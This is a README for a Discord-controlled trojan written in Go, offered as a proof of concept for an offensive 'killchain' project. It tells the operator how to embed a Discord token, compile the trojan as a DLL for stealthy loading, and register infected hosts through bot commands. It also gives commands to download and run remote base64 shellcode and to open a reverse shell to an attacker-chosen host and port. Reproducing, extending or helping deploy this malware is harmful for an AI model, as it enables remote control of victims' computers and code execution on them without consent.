```
 /$$$$$$ /$$   /$$               /$$$$$$                        /$$                                   /$$
|_  $$_/| $$  | $/              /$$__  $$                      | $$                                  | $$
  | $$ /$$$$$$|_//$$$$$$$      | $$  \__/  /$$$$$$  /$$$$$$$  /$$$$$$    /$$$$$$  /$$$$$$$   /$$$$$$ | $$
  | $$|_  $$_/  /$$_____/      |  $$$$$$  |____  $$| $$__  $$|_  $$_/   |____  $$| $$__  $$ |____  $$| $$
  | $$  | $$   |  $$$$$$        \____  $$  /$$$$$$$| $$  \ $$  | $$      /$$$$$$$| $$  \ $$  /$$$$$$$|__/
  | $$  | $$ /$$\____  $$       /$$  \ $$ /$$__  $$| $$  | $$  | $$ /$$ /$$__  $$| $$  | $$ /$$__  $$    
 /$$$$$$|  $$$$//$$$$$$$/      |  $$$$$$/|  $$$$$$$| $$  | $$  |  $$$$/|  $$$$$$$| $$  | $$|  $$$$$$$ /$$
|______/ \___/ |_______/        \______/  \_______/|__/  |__/   \___/   \_______/|__/  |__/ \_______/|__/


"These blocks belong to us homie remember I told you that!"

                                                            ~ Santana
```

Discord based trojan serving as a proof of concept for [TheKillchain](https://github.com/bakarilevy/TheKillchain)

## Compiling

This trojan is intended to be compiled with your discord token in the source code prior to deployment.
```go
var DISCORD_TOKEN string = "YOUR_DISCORD_TOKEN_HERE"
```
For this reason you will need to compile this on a device with the Go compiler installed.
The preferred method of using this tool is as a native dynamic link library.
In order to compile Go source code as a dynamic link library you will need to run the following command:

```
go build -o <dll-name>.dll -buildmode=c-shared
```

You will substitute the dll-name variable with the name of the dll you would like to output.

## Code Execution

How do we manage to achieve code execution from the dll?
There are several ways to achieve this, in TheKillchain I discuss using the living off the land technique to execute the DLL main function of the dll.

## Usage

Once the trojan has been loaded it will check in to your Discord server however it will not take any actions.
You can interact with the trojan by running the !salute command.
This will generate a unique id for the trojan after which you can run the !set-active command with the generated id to allow the trojan to execute commands on the target.

```
!set-active <UUID>
```

UUID will be the string you get from running the !salute command.

Currently I have implemented shellcode execution using this tool as well as a reverse shell.
Due to how noisy using the GetAsyncKeyState Win32api function is I have decided not to include the keylogger as functionality for the tool.
I may consider adding this functionality later.

To execute shellcode simply provide a url to the location of your shellcode as a base64 encoded string in a json format:

JSON Shellcode:
```json
{
    "Shellcode": "BASE64ENCODEDSHELLCODE"
}
```

Using Discord command:
```
!exec-shellcode https://<my-domain>.com/my/shellcode/shellcode.json
```

To get the reverse shell use the commands to set the host and port in discord:
```
!set-rshell-host <ip-addr/domain>
!set-rshell-post <port-number>
!reverse-shell
```

You can of course check those settings running the get commands:
```
get-rshell-host
get-rshell-port
```